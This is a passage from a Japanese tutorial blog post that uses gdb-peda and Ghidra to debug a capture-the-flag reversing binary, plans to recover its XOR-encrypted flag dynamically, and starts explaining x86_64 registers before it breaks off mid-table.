&lt;p&gt;これでmain関数のRVAを特定できたので、さっそくブレークポイントを設定して実行してみましょう。&lt;/p&gt;
&lt;p&gt;以下のコマンドでブレークポイントを設定します。&lt;/p&gt;
&lt;p&gt;アドレスを指定してブレークポイントを設定する場合は&lt;code class=&quot;language-text&quot;&gt;*&lt;/code&gt;を付ける必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ b *0x555555555208
Breakpoint &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; at 0x555555555208&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ブレークポイントの設定は、&lt;code class=&quot;language-text&quot;&gt;i breakpoint&lt;/code&gt;で確認可能です。&lt;/p&gt;
&lt;p&gt;今回は使用しませんが、&lt;code class=&quot;language-text&quot;&gt;Num&lt;/code&gt;の値がブレークポイントのIDとなるので、これを使用して&lt;code class=&quot;language-text&quot;&gt;delete &amp;lt;Num&gt;&lt;/code&gt;もしくは&lt;code class=&quot;language-text&quot;&gt;d &amp;lt;Num&gt;&lt;/code&gt;コマンドを使ってブレークポイントを削除することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;i breakpoints 
Num     Type           Disp     Enb Address            What
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;       breakpoint     keep y   0x0000555555555208&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ブレークポイントが設定されたことが確認できたので、&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;コマンドを呼び出しましょう。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/59ec8e486270cce47644255bfe5bfac0/2bef9/image-46-1024x914.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 89.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAARlAAAEZQAGA43XUAAACrElEQVQ4y5VU2W7jMBDz1+SwY/mQrMNnnGt7oEVR9P9/hctR6jTZBRbYh4ElxxqRHDKJGQNaH6BrjaqsYIyGDwGK61wV2O12rAzr9RqbzYbPTVzLU/bb7fZWsk+auUe/PyFMR7T7M2pt4PoZHdfdfME0DTgeue8C+r5FVZUoyyJWUajvS9a35omdOwTnYWpDdA2C92iJMCcyledQSkXUUk1jYG0TG12blhG97G8I69bCNRaWzQzRheDQBY88y1hppCwHliaCcKEovymVo66rn4a6c/C8OeOLPE3jQa1r6pdjRSrSoCiu9Far1Y3efT1S3nfoSFMRkeKNuq4jvXQRm5fcC/+viggdG05jH1+kkUYWqWz/uP1ftTSLCCtStt5GVFmp0FrR0yCtC3TWofEOaaUoS4NT16GiHLu65Le0lOZQKM29fRLnHH49XfDy+gTHwzLVhoc91+fzEfNhhnMWmhdWVYU0zaKmhrrL91rrB5TJSLofH2/4+vqArFNq2Z73ML6Jtsk46cVz6hvNYhV5L+8eKLdtwPv7Kz4/3zEMXfx4Ooy83UbfLToudT/ZpRa6KQeYGNKb5z3TcIgNcqKSSYtpL5cT+nGIZhbaGdFn2e46eZbQl7ofXvLy+gzfT/DDAWE8orGe+gUM40STd9w7uNCi7QeEjjEdembdRw2FXde1USoxt3g2eSPdfj7F7A5HDoax63ngMJI20yPopmmkCwwHY+Iho+uon7Xcx/hdEyPsEpluOwq6Axs+wzLXA/8IrGSXBz2p1jEt1/hJxkUr8aw4QrT70ZOUp/0E4wKrhW1HVPW1UXBXPwotoSjabb6Ts2gX19R1u73zoTRsDCkUJZrQo+Kfg2YUnfdxCEv0Iqq/KovPB2NLAkQzmaIq2bjSKPhUvCDPd9GH/xO93yWjNWbpb/9EAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/59ec8e486270cce47644255bfe5bfac0/8ac56/image-46-1024x914.webp 240w,
/static/59ec8e486270cce47644255bfe5bfac0/d3be9/image-46-1024x914.webp 480w,
/static/59ec8e486270cce47644255bfe5bfac0/e46b2/image-46-1024x914.webp 960w,
/static/59ec8e486270cce47644255bfe5bfac0/a9a89/image-46-1024x914.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/59ec8e486270cce47644255bfe5bfac0/8ff5a/image-46-1024x914.png 240w,
/static/59ec8e486270cce47644255bfe5bfac0/e85cb/image-46-1024x914.png 480w,
/static/59ec8e486270cce47644255bfe5bfac0/d9199/image-46-1024x914.png 960w,
/static/59ec8e486270cce47644255bfe5bfac0/2bef9/image-46-1024x914.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/59ec8e486270cce47644255bfe5bfac0/d9199/image-46-1024x914.png&quot;
            alt=&quot;2021/12/image-46-1024x914.png&quot;
            title=&quot;2021/12/image-46-1024x914.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;main関数の呼び出しタイミングで処理が停止し、gdb-pedaによってレジスタやスタックの情報が表示されました。&lt;/p&gt;
&lt;p&gt;ちなみに&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;コマンドはgdbからプロセスを起動するコマンドで、実行時にコマンドライン引数を与えたい場合は&lt;code class=&quot;language-text&quot;&gt;run &amp;lt;コマンドライン引数&gt;&lt;/code&gt;のようにして呼び出します。&lt;/p&gt;
&lt;h3 id=&quot;ghidraのイメージベースを変更する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ghidra%E3%81%AE%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%83%99%E3%83%BC%E3%82%B9%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot; aria-label=&quot;ghidraのイメージベースを変更する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ghidraのイメージベースを変更する&lt;/h3&gt;
&lt;p&gt;ここからはGhidraのデコンパイル結果とgdbを対応させながら解析を進めていくので、Ghidraのベースアドレスをgdbに合わせて&lt;code class=&quot;language-text&quot;&gt;0x555555554000&lt;/code&gt;に変更しておきましょう。&lt;/p&gt;
&lt;p&gt;Ghidraのベースアドレスの変更は、ファイルインポート時の[Options]から行うか、[Window]&gt;[Memory Map]を開いて、右側にある[Set Image Base]ボタンから変更できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/67fe8c8bb0b1f268968790135c4af31e/0b533/image-47.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 91.25000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAARlAAAEZQAGA43XUAAAEWElEQVQ4y12Ue0yTZxSHv6pTQQQp4AbqdPMu6Bx4WXTgyBxDRd1ccM4su2UxJmabxgtTUZEquika/zCZm85ApoCIlIsUKCi3OJ2ZmukWY7zgUIyTUlpov7a0PDttGTrf5OS8pz15ct7v/M5RFi/7lOQlK5n/7gfMT17OOwtSSUhcSvKCFSxcnMpbSe+TmLyElPc+IT5xEdPjEpk0ZQ4DtVNRhsWihMaJjxEfjRL4MkpJSQW379zjyo3b/HGzmSt/3qHx0nXqGq9Rd/GqLz50+DhbNu8m5+gpDh78kfR0HcO0kSj9tGgCRqIEjUMJnizQaSg1xnq6PWCyQ7vdjcUJD6xmbrU+4W+zFRU4mnuGigoj/x2LxUxk1GgUZQAaTYD4wSiaIJQBWpSqqnN02Z20ttu5ee8x1/6y0WqSuE2l1aziEsBPOYXo9RU+mMfj4f79FsLD5XnKIPr1D/LBNJohvliA53E6XdhVB/eam7F29hWCu9cXnTmLsaau73erJIUNf8UPUIKeVuj1fqAT1a6iLynlxEk9lVVGiovPoi8ro6Gxie0Zu8nau5+6+gaqjbXkF5xmzNgYgkMi0WqjCNWOJGzEq4QMl+9ZVd1boQA/W7WWCZNnMCV6JuMnzWDchDjGTZxB7MxEn02ZOsdn0VPnMj12HtNej+e12ASxecTNTmRizEw/0OVy0dVl4+jPuWzLzGZjxiEydfvZtSubHRnfkbric1KWfiT+CxYt/VBktoyvv9nKuvXbWZ+2gw1pmWTs3E+SSEyplKa43W7M5g4ePTZh6nTRYlJps9ixuzz8fuMObyelEp+Qwtw3FzHrjSQWpizn4vX7dNg9WLocmCw2RCjo9hzwd9kLNJnaefTELJAeOu0uOrqcCE+Ad5k1eyGxcfMFtoDomATi56bQcLWZDrUHq+S2d6r0CDBj177/Ay02p18az3T47mM7ur2HyfnlFLkniyg9WyvN+ZVbj1SkQF+u2pucmZXtf3J3t//J5YZzFJca0ZfX+MwbH8urIOvAEfILSzmWU4DB2Eh902WKDBeoPn+J8w2/YTx3gYuXr7N6zYanTfFaU9MlSksr0RcZOJ0vsik2UFNdz+YtOnZmfk9NTT3l5dXk5BYQFTWegIAwhgZHEhw+lqHa0QRKrBhl9Lyycbm6efY4rD24bP57Xn7Jc8K2EhY2QoTcX8YtVGY6GCUgXO4hfmF7YaqqSmKXmAebzTs5LswSez/P8dw8yssMfcCWlodEjJIN88JL9PNCZEI0SiCaAUNRDIZagTnERCYy0+3tHpwONz0ysw6nv0kn8gopewb44MFDwiNlwwSMQfOiiDlCVljoZDSDh6PUN1zg+eN2iBz+UelsU31xQWEJhsravv/bTCYiwr1PVtAMEsiQUSiDIuTpUqFOl80PR3JI26wjffsetqRn+e4bN+1k7bptbJIpWPnxar5ctY6t27LY9G0ma75KIygkqnc5DPStMZ/XBPIvaq/fVXR6p6gAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/67fe8c8bb0b1f268968790135c4af31e/8ac56/image-47.webp 240w,
/static/67fe8c8bb0b1f268968790135c4af31e/d3be9/image-47.webp 480w,
/static/67fe8c8bb0b1f268968790135c4af31e/b0a15/image-47.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/67fe8c8bb0b1f268968790135c4af31e/8ff5a/image-47.png 240w,
/static/67fe8c8bb0b1f268968790135c4af31e/e85cb/image-47.png 480w,
/static/67fe8c8bb0b1f268968790135c4af31e/0b533/image-47.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/67fe8c8bb0b1f268968790135c4af31e/0b533/image-47.png&quot;
            alt=&quot;2021/12/image-47.png&quot;
            title=&quot;2021/12/image-47.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでmain関数のアドレスも、gdbにロードされるアドレスと同じ&lt;code class=&quot;language-text&quot;&gt;0x555555555208&lt;/code&gt;に変更されたので、対応が分かりやすくなりました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 824px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/17181c775952044021d3f1860e572160/c1c45/image-48.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 109.16666666666669%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD0UlEQVQ4y31V227bRhTU7zZFYRSJnSIoegGKNmid3hDJMdAm6UP7Bf2GPiQP7oOR1HasUKQkikvxfucuOZ1dyrJUAxWwXmIvs3PmzDkefXDvB3z+xZ84PPwDR0e/46ODX3Hvw+c4OPgFDx6c4uP7Exx+MsbRwx9x/+gYDx8d49FnHJ8+xk8/n+Kbr5/gu+On+PKr7/Ht4ycYnTx7Cf1brwNkWYo0DeH7QJ6bZTRNb+a6LZA2BRql0CmgH5bv/EZPx8/Nx9L14HkC87kNZ14bUCkVkqRG13V8oEBZ1ny0RRBWXC8hVWOAe/7pNmM03gBac4E1D/tpjajoQRyEhcI6JUAuEfM7KiT3K4R5g6hUZn2dNeZeXPFOtQP43hHgwwjKHise0N+2n+F6sYYrEszWOZyggCMyLDh7SWPGKtYzz/NezDs7gB4iLujN6TwhE4VVVMNyYvheAcvN4PglYjLX5zTAzbDjBKJoYcXxPmDIw+tQYn5JwICvZh2WVoHFrIBrk5VLOeoBTIPeAJ+tplikBf5evf8PQx4WQQPrPITwqU0iYV/GmF+ncN6lWDrFFvAGVM+vlxewkwRv/CVtc/Jyj6Hn15ie+fBETcAO1psI9kVsgBdWvgeoNdPjL+ccTpLiXDgYTSYvtkmhvswmDLuA4QYUbE3GfiDJnA6gHGF1G7LIW7hZCSuKMKOOZ+701tiWvcLUFriYLSl+C5HCAL6zM/g5/dh0oIMMI20pPfyCGc5pI1roMnAZMhmOJ4OGLo399u0/ePX6FWazFPQxyoohWwnatkWSCVRSGvMqGl3PN9XS7ZTNFnC1Eqb8PG+J6bTB1ZWuFF0h1AE0bRow5AB1XSKtcoIqs94bsGHuTaVsAZnlKEYY+nAcaibM2yhYHbr00jRFVeZomwqSa3VRkJk0d/sN236XoUvA+XxBdle4vi6xXA4MI6rf9x1r2EcU56xnhYzJiKhvEJRkPIDqRxUbx17IYUj/CZfADTUdAAtWgH67yBNUFRuF6iAbCcU9vd91/ZalBh1NNj7UIbtEse0pGVbUE4aZZqgB67ULGQfoqhJdlqBXcq9taXaG4bPT37YMhfCxWDhkWBsNldLaNQNwHDLzKUPO0TDkvKygerVlt83y5OTFFrAsS46MtlEENUfZYJW5UBKgrpkQ2UBVClVdQ3ZqJyl3siwofMbGGTEhkkyHkKtKbpKS8btglmuTZf3ALuCtD8e3tgmCISmW1ZAlNp26NYAxW1NG7WoNyn6ZZQy9k/8HKBgOs8e27nmdsY0OWakhlGFPe1INmdb/W/r+DuC/tSpvqIth0MsAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/17181c775952044021d3f1860e572160/8ac56/image-48.webp 240w,
/static/17181c775952044021d3f1860e572160/d3be9/image-48.webp 480w,
/static/17181c775952044021d3f1860e572160/5758c/image-48.webp 824w&quot;
              sizes=&quot;(max-width: 824px) 100vw, 824px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/17181c775952044021d3f1860e572160/8ff5a/image-48.png 240w,
/static/17181c775952044021d3f1860e572160/e85cb/image-48.png 480w,
/static/17181c775952044021d3f1860e572160/c1c45/image-48.png 824w&quot;
            sizes=&quot;(max-width: 824px) 100vw, 824px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/17181c775952044021d3f1860e572160/c1c45/image-48.png&quot;
            alt=&quot;2021/12/image-48.png&quot;
            title=&quot;2021/12/image-48.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;gdbでよく使うコマンド一部のみ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdb%E3%81%A7%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E4%B8%80%E9%83%A8%E3%81%AE%E3%81%BF&quot; aria-label=&quot;gdbでよく使うコマンド一部のみ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;gdbでよく使うコマンド(一部のみ)&lt;/h3&gt;
&lt;p&gt;ここから本格的に動的解析を進めていきますが、先にgdb操作でよく使うコマンドを整理しておきます。&lt;/p&gt;
&lt;p&gt;今回はごく一部のコマンドのみしか紹介しませんが、詳しくは&lt;a href=&quot;https://amzn.to/3lkunSs&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Debug Hacks&lt;/a&gt;などが参考になると思います。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;コマンド&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;break &amp;#x3C;ブレークポイント&gt;&lt;br /&gt;b &amp;#x3C;ブレークポイント&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;ブレークポイントを設定する&lt;br /&gt;アドレスを指定する場合は&lt;code class=&quot;language-text&quot;&gt;*&lt;/code&gt;が必要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;info &amp;#x3C;引数&gt;&lt;br /&gt;i &amp;#x3C;引数&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;実行中プロセスの情報を表示する&lt;br /&gt;引数無しで実行するとヘルプが表示される&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;run &amp;#x3C;コマンドライン引数&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;プロセスを実行する&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;p/&amp;#x3C;フォーマット&gt; $eax&lt;br /&gt;p/&amp;#x3C;フォーマット&gt; 変数&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;変数やレジスタの値を表示する&lt;br /&gt;フォーマットには x / d / c / s / i などを利用することが多い&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;x/&amp;#x3C;フォーマット&gt; &amp;#x3C;メモリアドレス&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;メモリの中身を表示する&lt;br /&gt;$ecxなどのようにレジスタの参照しているアドレスを確認することもできる&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;next&lt;br /&gt;n&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;一行ずつ実行する&lt;br /&gt;関数の呼び出し先にはジャンプしない&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;step&lt;br /&gt;s&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;処理を一つずつ実行する&lt;br /&gt;関数の呼び出し先にもジャンプする&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;continue&lt;br /&gt;c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;プロセスの実行を再開する&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;finish&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;今いる関数を終了するまで実行する&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;until&lt;br /&gt;u&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;指定した行まで実行する&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;実際に使用する場合は、以下のチートシートなども参考になると思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GDB Cheat Sheet&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;解析の方針を立てる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A7%A3%E6%9E%90%E3%81%AE%E6%96%B9%E9%87%9D%E3%82%92%E7%AB%8B%E3%81%A6%E3%82%8B&quot; aria-label=&quot;解析の方針を立てる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;解析の方針を立てる&lt;/h3&gt;
&lt;p&gt;とりあえずgdbを使ってブレークポイントを設定することができるようになりましたが、闇雲にブレークポイントを設定してもFlagを特定するのは非常に困難です。&lt;/p&gt;
&lt;p&gt;そのため、まずは静的解析の結果から解析方針を立てていこうと思います。&lt;/p&gt;
&lt;p&gt;今わかっている情報は以下の通りです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ユーザから入力された文字列をXOR暗号化してPTR&lt;em&gt;DAT&lt;/em&gt;00104010(イメージベースが&lt;code class=&quot;language-text&quot;&gt;0x100000&lt;/code&gt;だった時の名前)のバイト列と比較する&lt;/li&gt;
&lt;li&gt;XOR暗号化は一文字ずつ行われ、キーには関数FUN_001011e9(イメージベースが&lt;code class=&quot;language-text&quot;&gt;0x100000&lt;/code&gt;だった時の名前)の戻り値にループカウンタ&lt;code class=&quot;language-text&quot;&gt;lVar5&lt;/code&gt;を加算した値をが利用される&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;XOR暗号は、暗号化と復号に同じキーを利用します。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;A ^ K = B&lt;/code&gt;という方法で暗号化した場合は、&lt;code class=&quot;language-text&quot;&gt;B ^ K = A&lt;/code&gt;の式で元のデータを復号することができます。&lt;/p&gt;
&lt;p&gt;このような理由から、問題バイナリが暗号化に使用しているキーさえ特定することができれば、PTR&lt;em&gt;DAT&lt;/em&gt;00104010(イメージベースが&lt;code class=&quot;language-text&quot;&gt;0x100000&lt;/code&gt;だった時の名前)に格納されているバイト列に対してXOR演算を行うことで、元のFlag文字列を特定することができます。&lt;/p&gt;
&lt;p&gt;ここで、XOR暗号に使用するキーの元になる値は一文字ごとに以下のコードで生成されていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;DAT_0010402c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_0010402c * 0x41c64e6d + 0x3039 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; 0x7fffffff&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;もちろんここから静的解析でキーを特定することもできますが、少々面倒なので動的解析でキーを特定していきます。&lt;/p&gt;
&lt;p&gt;言い換えると、動的解析を利用して関数FUN_001011e9(イメージベースが&lt;code class=&quot;language-text&quot;&gt;0x100000&lt;/code&gt;だった時の名前)の戻り値を特定していこうということです。&lt;/p&gt;
&lt;h3 id=&quot;x86_64アーキテクチャのレジスタについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#x86_64%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%AE%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;x86_64アーキテクチャのレジスタについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;x86_64アーキテクチャのレジスタについて&lt;/h3&gt;
&lt;p&gt;関数の戻り値をgdbで特定する前に、少しだけレジスタについて触れておきます。&lt;/p&gt;
&lt;p&gt;x86_64アーキテクチャとは、Intelのx86アーキテクチャを64ビットに拡張したものです。&lt;/p&gt;
&lt;p&gt;x86_64アーキテクチャのCPUには、64bitの汎用レジスタが16個、64bitのRPIレジスタとRFRAGSレジスタが1個ずつ、128bitのXMMレジスタが16個搭載されています。&lt;/p&gt;
&lt;p&gt;主なレジスタの用途については下記に整理しておきます。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;レジスタ&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RAX&lt;br /&gt;（アキュムレータ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;主に演算結果、関数の戻り値などが格納される汎用レジスタです&lt;br /&gt;下位32bitをEAXレジスタとして利用します&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
